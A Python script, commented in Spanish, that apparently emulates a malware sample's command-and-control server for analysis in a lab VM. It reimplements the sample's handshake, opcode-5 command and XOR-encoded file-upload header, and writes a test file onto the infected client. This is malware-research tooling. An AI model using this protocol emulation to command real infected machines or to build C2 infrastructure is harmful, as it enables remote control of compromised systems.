#!/usr/bin/env python3

# -*- coding: utf-8 -*-



import socket, struct, binascii, datetime



HOST = ''           # 0.0.0.0

PORT = 443

RECV_SZ = 65535

TIMEOUT_S = 60



# === AJUSTA ESTO ===

DEST_PATH   = r"C:\Users\usuario\Desktop\upload_test.bin"  # ruta en la VM

FILE_CONTENT = b"Hello from C2!\r\nThis file came via opcode 5.\r\n"



# -------------------



def hexdump(b: bytes) -> str:

    hx = binascii.hexlify(b).decode()

    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))



def safe_ascii(b: bytes) -> bytes:

    return bytes(ch if 32 <= ch < 127 else 0x2E for ch in b)



def make_handshake_reply() -> bytes:

    return b"fxftest\x00"  # eco/handshake de 8B



def make_cmd(opcode: int) -> bytes:

    # Paquete de mando 0x104: [opcode(LE)] + 0x100 de ceros

    pkt = struct.pack("<I", opcode) + b"\x00" * (0x104 - 4)

    return pkt


    

def make_opcode5_header(path: str, total_len: int) -> bytes:

    """

    Buffer de 0x214 bytes esperado por FUN_004020f0:

      - recv() guarda en [ESP+4]  -> nuestro buffer base.

      - XOR 0x55 sobre [ESP+0x14 .. ESP+0x213] (0x200 bytes)

      - CreateFileA usa lpFileName = [ESP+0x28]  -> offset 0x24 dentro del buffer

      - Tamaño total del fichero en [ESP+0x214]  -> offset 0x210 dentro del buffer (SIN XOR)

    """

    buf = bytearray(0x214)               # todo a cero

    # ---- path en offset 0x24 (dentro de la zona XOR) ----

    p = path.encode('ascii', errors='ignore') + b'\x00'

    max_path = 0x200 - 0x24              # desde 0x24 hasta 0x223 inclusive

    if len(p) > max_path:

        p = p[:max_path-1] + b'\x00'

    buf[0x24:0x24 + len(p)] = p



    # ---- tamaño en offset 0x210 (fuera de la zona XOR, SIN XOR) ----

    buf[0x210:0x214] = struct.pack("<I", total_len)



    # ---- XOR 0x55 sobre [0x14..0x213] (incluye el path, NO el size) ----

    for i in range(0x14, 0x214):

        buf[i] ^= 0x55



    return bytes(buf)




def run_server():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((HOST, PORT))

    s.listen(5)

    print(f"[*] Escuchando en 0.0.0.0:{PORT}")



    while True:

        c, addr = s.accept()

        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"\n[+] {ts} Conexión de {addr[0]}:{addr[1]}")

        c.settimeout(TIMEOUT_S)



        try:

            # 1) HELLO

            d = c.recv(RECV_SZ)

            print(f"[RX {len(d)} B] ASCII={safe_ascii(d)!r}\nHEX = {hexdump(d)}")

            if b"fxftest" not in d:

                print("[!] No es el hello esperado.")

                c.close()

                continue

            c.sendall(make_handshake_reply())

            print("[TX handshake 8B]")



            # 2) SYSINFO (512B)

            d = c.recv(RECV_SZ)

            print(f"[RX {len(d)} B] ASCII={safe_ascii(d)!r}\nHEX = {hexdump(d)}")



            # 3) Enviar comando opcode 5

            cmd = make_cmd(5)

            c.sendall(cmd)

            print("[TX opcode=5 0x104B]")



            # 4) Enviar header 0x214 con path y tamaño (con XOR correcto)

            header = make_opcode5_header(DEST_PATH, len(FILE_CONTENT))

            c.sendall(header)

            print(f"[TX header 0x214] path={DEST_PATH!r}, size={len(FILE_CONTENT)}")



            # 5) Enviar contenido del fichero (en tantos trozos como quieras)

            #    El malware hace recv() de hasta 0x400 (1024) cada vez.

            sent = 0

            CHUNK = 512

            while sent < len(FILE_CONTENT):

                chunk = FILE_CONTENT[sent:sent+CHUNK]

                c.sendall(chunk)

                sent += len(chunk)

            print(f"[TX data] {sent} bytes enviados")



            # 6) Recibir respuesta: "upfileok" (longitud ~9 con NUL) o "upfileer"

            resp = c.recv(32)

            print(f"[RX status] {resp!r}  HEX={hexdump(resp)}")

            if b"upfileok" in resp:

                print("[OK] El cliente escribió el archivo correctamente.")

            elif b"upfileer" in resp:

                print("[FAIL] Error de creación/escritura en el cliente.")

            else:

                print("[?] Respuesta inesperada.")



        except socket.timeout:

            print("[!] Timeout.")

        except Exception as e:

            print(f"[!] Error: {e}")

        finally:

            try:

                c.shutdown(socket.SHUT_RDWR)

            except Exception:

                pass

            c.close()

            print("[*] Conexión cerrada.")



if __name__ == "__main__":

    run_server()
